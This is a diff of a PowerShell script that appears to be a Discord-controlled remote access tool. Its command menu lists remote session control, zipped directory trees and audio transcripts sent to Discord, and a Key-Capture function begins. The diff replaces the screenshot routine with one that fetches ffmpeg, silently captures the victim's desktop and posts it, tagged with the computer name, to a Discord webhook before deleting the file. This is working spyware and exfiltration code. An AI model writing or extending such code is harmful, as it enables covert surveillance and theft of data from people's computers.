@@ -94,7 +94,7 @@ $contents = "==============================================
 
 Close   : Close this Session
 Extra-Info    : Extra commands information
-Pause-Session   : Kills this session and restarts
+Pause-Session   : Pause this session
 Toggle-Errors    : Toggle error messages to chat
 Folder-Tree    : Gets Dir tree and sends it zipped
 SpeechToText  : Send audio transcript to Discord
@@ -356,16 +356,15 @@ Post-Message | Out-Null
 }
 
 Function Screenshot{
-Add-Type -AssemblyName System.Windows.Forms
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
-$filePath = "$env:temp\sc.png"
-$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-$graphics.Dispose()
-$bitmap.Dispose()
-Post-File; rm -Path $filePath -Force
+    $Path = "$env:Temp\ffmpeg.exe"
+    If (!(Test-Path $Path)){  
+        GetFfmpeg
+    }
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    $filePath = "$env:Temp\ScreenClip.jpg"
+    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $filePath
+    Post-File ;rm -Path $FilePath -Force
 }
 
 Function Key-Capture {
